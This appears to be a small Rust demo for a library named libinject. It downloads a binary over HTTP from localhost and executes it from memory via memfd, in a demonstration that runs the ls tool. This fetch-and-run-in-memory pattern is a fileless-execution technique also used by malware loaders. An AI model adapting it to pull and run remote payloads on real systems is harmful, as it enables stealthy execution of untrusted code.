#![allow(unused_imports)]
extern crate libinject;
use libinject::memfd;

use std::fs;

pub fn get_binary_filesystem(path: &str) -> Vec<u8> {
    fs::read(path).expect("Faild to open file")
}

pub fn get_binary_http(url: &str) -> Vec<u8> {
    let response = reqwest::blocking::get(url).expect("Failed to download file");
    response.bytes().unwrap().to_vec()
}

fn main() {
    // let binary_location = "/usr/bin/ls";
    let binary_location = "http://127.0.0.1:8081/ls";
    let binary_name = binary_location.split('/').last().unwrap();
    // let binary_bytes = get_binary_filesystem(binary_location);
    let binary_bytes = get_binary_http(binary_location);

    match memfd(binary_name, "-l -A -h", &binary_bytes) {
        Ok(res) => res,
        Err(error) => panic!("An error occured: {error:?}"),
    };
}
